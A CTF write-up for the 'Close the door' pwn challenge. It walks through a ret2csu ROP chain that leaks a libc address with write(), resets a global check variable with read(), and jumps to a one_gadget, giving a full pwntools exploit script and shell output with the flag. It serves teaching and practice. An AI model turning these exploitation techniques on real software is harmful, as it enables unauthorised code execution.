

# Close the door

The description for this challenge is as follows:

*The extraterrestrials have been chasing us for hours but we managed to escape by hiding in one of the power plants. We closed the door and kept them away. The only problem is that we do not know the secret password to open the emergency door and escape. If we do not manage to unlock the door, we are doomed!
This challenge will raise 43 euros for a good cause.*

So, this challenge was placed in the miscellaneous category, but realistically, it is a (relatively) straightforward ret2csu rop challenge, at least according to how I solved it. It was rated two out of four stars, and I believe it had the fewest solves of any pwn challenge.

**TL;DR Solution:** This is a ret2csu challenge that uses write to do a libc leak and read to overwrite the global check variable that otherwise prevents the hidden_func from running properly a second time.

So, since this was a miscellaneous challenge, I did attempt to interact with it live initially, but I didn't find anything particularly notable.

On to some basic reconnaissance on the locally downloaded file. Running checksec on the file produces the following result: 

```
[*] '/home/knittingirl/CTF/HTBApocalypse/close_the_door/close_the_door'

    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

And an initial run-through of the program is fairly straightforward looking:


```
knittingirl@piglet:~/CTF/HTBApocalypse/close_the_door$ ./close_the_door 
Any ideas where to search ❓
> aaaaaaaaaaaaaaa

1. 🔍 for the secret password
2. Give up 😫
> 1
You found nothing of interest..

```

Now it's time to reverse engineer the program to figure out how to approach it. I like to use ghidra for this. One very interesting chunk of disassembled pseudo-C code is found in the main function; it looks like if instead of selecting 1 or 2 from the provided options, I type 42 (the decimal representation of 0x2a), I get a unique behavior; namely a variable is set to 1 and passed as a parameter to the mysterious hidden_func. The relevant portion of code is provided below.

```
    else {
      if (numeric_input != 0x2a) {
        write(1,local_58,(long)local_5c);
                    /* WARNING: Subroutine does not return */
        exit(0x16);
      }
      local_c = 1;
                    
      write(1,local_78,(long)local_7c);
    }
  }
  hidden_func((ulong)local_c);
```

If I try to run the program in the manner described above, I get the opportunity to provide more input. This triggers a segmentation fault with a long input, so it can be reasonably inferred that we have an overflow.

```
knittingirl@piglet:~/CTF/HTBApocalypse/close_the_door$ ./close_the_door 
Any ideas where to search ❓
> aaaa

1. 🔍 for the secret password
2. Give up 😫
> 42
You found something interesting!
Do you think this is the secret password?
> aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Segmentation fault

```

Since NX is enabled, that means that the approach to follow is probably a dynamic ROP chain; see my write-up on Controller if you need more details on how that works. We can use the cyclic trick in pwntools to determine the length of padding required, which is 72. We can also see that the length of payload we can send is almost unlimited. The code to get that is below; just x/s $rsp in the gdb terminal and determine the offset in the cyclic string.

```
from pwn import *

target = process('./close_the_door', env={"LD_PRELOAD":"./libc.so.6"})

#target = remote('138.68.182.108', 32576)

pid = gdb.attach(target, "\nb *hidden_func+244\n set disassembly-flavor intel\ncontinue")



elf = ELF("close_the_door")
libc = ELF("libc.so.6")

print(target.recvuntil(b'Any ideas where to search'))

payload = b'1' * 0xf

target.sendline(payload)

print(target.recvuntil(b'Give up'))

target.sendline(b'42')

print(target.recvuntil(b'Do you think this is the secret password?'))

payload = cyclic(1000)

target.sendline(payload)

target.interactive()
```

The first step in a dynamic ROP chain/ret2libc attack is to leak a value from libc so that we can determine the libc base, and from there, we can create a chain that calls system. Typically, puts or printf are preferred gadgets for this purpose, but after looking through the imports in ghidra, we do not have either function. Instead, we have write. The write function takes three arguments; in x86-64 calling convention, the first is passed in rdi, the second in rsi, and the last in rdx. In most normally compiled binaries, it is easy to find gadgets that pop values into rdi and rsi, but not rdx. In addition, the write function will only print out the number of characters indicated by the third parameter, which is set by rdx. After testing, we can confirm that rdx is set to 0 at the end of hidden_func, so we really have to figure out how to control this value.

The solution to our problem is the ret2csu attack. Basically, every normally compiled x86-64 binary has a function called __libc_csu_init, which contains a series of pop and mov instructions at its end. At the very end of the function are the pops, which should affect registers rbx, rbp, r12, r13, r14
and r15. Slightly earlier in the function, however, there are mov instructions that will load the contents of r13d, r14, and r15 into edi, rsi, and, most importantly, rdx. It also calls the function at the location of r12+rbx*8, so we need to make sure that that does not error out, and we also need to ensure that rbp = rbx + 1 in order to not experience an undesired jump after the mov sequence. For clarity, I have attached the relevant section of assembly code derived from Ghidra:

```
                             LAB_00400b30                                    XREF[1]:     00400b44(j)  
        00400b30 4c 89 fa        MOV        RDX,R15
        00400b33 4c 89 f6        MOV        RSI,R14
        00400b36 44 89 ef        MOV        EDI,R13D
        00400b39 41 ff 14 dc     CALL       qword ptr [R12 + RBX*0x8]=>->frame_dummy         undefined frame_dummy()
                                                                                             = 400790h
                                                                                             = 4007C0h
                                                                                             undefined __do_global_dtors_aux()
        00400b3d 48 83 c3 01     ADD        RBX,0x1
        00400b41 48 39 dd        CMP        RBP,RBX
        00400b44 75 ea           JNZ        LAB_00400b30

                             LAB_00400b46                                    XREF[1]:     00400b24(j)  
        00400b46 48 83 c4 08     ADD        RSP,0x8
        00400b4a 5b              POP        RBX
        00400b4b 5d              POP        RBP
        00400b4c 41 5c           POP        R12
        00400b4e 41 5d           POP        R13
        00400b50 41 5e           POP        R14
        00400b52 41 5f           POP        R15
        00400b54 c3              RET

```

In short, the general strategy with a ret2csu attack is to first call the section that starts the sequence of pops; in this case, the gadget is 0x00400b4a. I will typically set rbx to 0 and rbp to 1 to satisfy the comparison and simplify the r12 decision. Filling r12 is slightly more complicated; good functions to try to call are _init() and _fini, which don't really do much, so they should exit out without causing any problems. However, since the call dereferences the value of r12+rbx*8, we need to find an area in the program that points to the _init() function, rather than just using the address of _init(). You could do this by firing up a program that can read the .dynamic section, since this should contain a pointer to _init(); however, in my humble opinion, it is easier to instead just use the search-pattern command on GDB-GEF to look for spots in memory that point to the address of the _init() function as derived from Ghidra. Then we just fill in r13, r14, and r15 with our desired parameter values; r13 gets 1, which means the write() function will print to stdout, r14 gets the address of the GOT entry for write, which should contain the libc address of the write function which will then be printed to the console, and r15 gets filled with 8, so that 8 characters will be printed to the console, which should be the full length of the libc address. Then call the portion of __libc_csu_init() that triggers the movs, and then return to hidden_func so that we can send another payload based on our leak. The relevant section of code is as follows:

```
#Gadgets:
write_plt = p64(0x00400660)
csu_pops = p64(0x00400b4a)
csu_movs = p64(0x00400b30)
init = p64(0x601dc0)
write_got_plt = p64(0x601fb0)
hidden_func = p64(0x00400814)


padding = b'a' * 72
payload = padding

payload += csu_pops
payload += p64(0) #rbx
payload += p64(1) # rbp
payload += init #r12 gets
payload += p64(1) #r13 goes to edi
payload += write_got_plt #r14, goes to rsi
payload += p64(0x8) # r15, goes to rdx

payload += csu_movs
payload += b'a' * 8 #for the rsp+8
payload += b'a' * 8 * 6 #for the pops


payload += write_plt

#You need to set the first parameter to 1 or hidden_func exits; it's fairly clear from the decompilation 

payload += pop_rdi
payload += p64(1)

payload += hidden_func


target.sendline(payload)

```

At this point, I wrote the code to get the libc base, found onegadgets, and thought I was good to go. However, my second payload did not seem to be going through properly. At this point, I remembered that a portion of the hidden_func involved a call to fclose(), and in light of the challenge name, I re-reviewed it:

```
  if (check != 0) {
    fclose(stdout);
    fclose(stderr);
  }
  check = check + 1;
  return;
```
check is a global variable; since it is getting iterated up by 1 every time hidden_func is called, it will only be equal to 0 the first time through, which presents a problem since calling the fclose() is, I believe, flushing my input and payload. Ultimately, the solution seems to be to create another portion of ropchain in the first payload that will write the value of global variable check back to 0. The only viable candidate for a write-what-where gadget was the read() function, which effectively works like write() in reverse. I ended up writing another ret2csu for the read function; in hindsight, the value of rdx was still 8 after the write() function finished, so I could have just popped values into rdi and rsi with more straightforward gadgets, but this is what I did:

```
#New Gadgets:
check = p64(0x00602050)
read_plt = p64(0x004006a0)

#The read ropchain

payload += csu_pops
payload += p64(0) #rbx
payload += p64(1) # rbp
payload += init #r12 gets called
payload += p64(0) #r13 goes to edi
payload += check #r14, goes to rsi
payload += p64(0x8) # r15, goes to rdx

payload += csu_movs
payload += b'a' * 8 #for the rsp+8
payload += b'a' * 8 * 6 #for the pops
payload += read_plt

```

And that seems to have worked! My full exploit is copy-pasted below; I did have some input/output issues that I fiddled with things to make work, and I ended up calling read twice on my first ropchain and adding a timeout, which seems to have fixed it.

```
from pwn import *

#target = process('./close_the_door', env={"LD_PRELOAD":"./libc.so.6"})
target = remote('188.166.173.176', 31223)

#pid = gdb.attach(target, "\nb *hidden_func+164\n set disassembly-flavor intel\ncontinue")



elf = ELF("close_the_door")
libc = ELF("libc.so.6")
#Gadgets:

#onegadget_offset = 0x4f3d5
onegadget_offset = 0x4f432
pop_rdi = p64(0x0000000000400b53) # : pop rdi ; ret
write_plt = p64(0x00400660)
csu_pops = p64(0x00400b4a)
csu_movs = p64(0x00400b30)
init = p64(0x601dc0)
write_got_plt = p64(0x601fb0)
hidden_func = p64(0x00400814)
main = p64(0x00400909)
check = p64(0x00602050)
read_plt = p64(0x004006a0)
pop_rsi = p64(0x0000000000400b51) # : pop rsi ; pop r15 ; ret
empty = p64(0x602280)

print(target.recvuntil(b'Any ideas where to search'))

payload = b'1' * 0xf

target.sendline(payload)

print(target.recvuntil(b'Give up'))

target.sendline(b'42')

print(target.recvuntil(b'Do you think this is the secret password?'))

padding = b'a' * 72
payload = padding


payload += csu_pops
payload += p64(0) #rbx
payload += p64(1) # rbp
payload += init #r12 gets
payload += p64(1) #r13 goes to edi
payload += write_got_plt #r14, goes to rsi
payload += p64(0x8) # r15, goes to rdx

payload += csu_movs
payload += b'a' * 8 #for the rsp+8
payload += b'a' * 8 * 6 #for the pops


payload += write_plt


#check has to be set to 0 or it won't work.

payload += csu_pops
payload += p64(0) #rbx
payload += p64(1) # rbp
payload += init #r12 gets called
payload += p64(0) #r13 goes to edi
payload += check #r14, goes to rsi
payload += p64(0x8) # r15, goes to rdx

payload += csu_movs
payload += b'a' * 8 #for the rsp+8
payload += b'a' * 8 * 6 #for the pops
payload += read_plt


#Adding this plus the timeout later fixes my I/O problem

payload += pop_rsi
payload += empty
payload += p64(0)
payload += read_plt

#And call hidden_function again
payload += pop_rdi
payload += p64(1)

payload += hidden_func


target.sendline(payload)
print('payload sent')
payload2 = b'\x00' * 8 + b'\x00'
target.sendline(payload2)

result = target.recvuntil(b'Do you', timeout=1)
print('result obtained', result)

write_libc = result.replace(b'Do you', b'').replace(b'\n>', b'')

print(len(write_libc[1:9]))
write_libc_num = u64(write_libc[1:9])
print(hex(write_libc_num))

libc_base = write_libc_num - libc.symbols['write']
onegadget = libc_base + onegadget_offset
strlen_libc = libc_base + libc.symbols["strlen"]
print(hex(strlen_libc))

print(target.recvuntil(b' think this is the secret password?'))


payload = padding
#I like to add extra nulls after onegadgets since sometimes, rsp+0x40=null or similar is a requirement, and the extra nulls sort that if it's not already fulfilled.
payload += p64(onegadget) + b'\x00' * 0x50

target.sendline(payload)


target.interactive()

```

And here is what my successful output looked like:

```
ubuntu@ubuntu1804:~/CTF/HTBApocalypse/close_the_door$ python3 close_the_door_payload.py NOPTRACE
[+] Opening connection to 188.166.173.176 on port 31223: Done
[*] '/home/ubuntu/CTF/HTBApocalypse/close_the_door/close_the_door'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] '/home/ubuntu/CTF/HTBApocalypse/close_the_door/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
b'Any ideas where to search'
b' \xe2\x9d\x93\n> \n1. \xf0\x9f\x94\x8d for the secret password\n2. Give up'
b' \xf0\x9f\x98\xab\n> You found something interesting!\nDo you think this is the secret password?'
payload sent
result obtained b'\n> \x10\x82\x9e\x8cX\x7f\x00\x00Do you'
8
0x7f588c9e8210
0x7f588c975db0
b' think this is the secret password?'
[*] Switching to interactive mode

> $ whoami
ctf
$ ls
close_the_door    flag.txt  libc.so.6
$ cat flag.txt
CHTB{f_cl0s3d_d00r5_w1ll_n0t_st0p_us}
[*] Got EOF while reading in interactive
$ 
[*] Interrupted

```
